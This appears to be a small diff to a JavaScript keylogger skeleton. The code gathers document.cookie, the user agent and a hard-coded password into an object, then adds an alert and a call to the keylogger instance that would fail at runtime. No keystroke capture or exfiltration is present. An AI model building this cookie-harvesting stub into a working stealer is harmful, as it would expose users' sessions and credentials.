@@ -3,7 +3,7 @@
 	'use strict'
 
 	var config = config || {
-		connection: "***",
+		connection: "****",
 		timeout: 1000,
 	};
 
@@ -12,13 +12,15 @@
 		password: "#x73fz!!", 
 		cookie: document.cookie,
 		useragent: navigator.userAgent
-
 	};
 
 	function Keylogger () {
       // Keylogger Function
+      window.alert("Hello Keylogger");
   }
 
   var keylogger = new Keylogger();
+
+  keylogger();
 
 })();
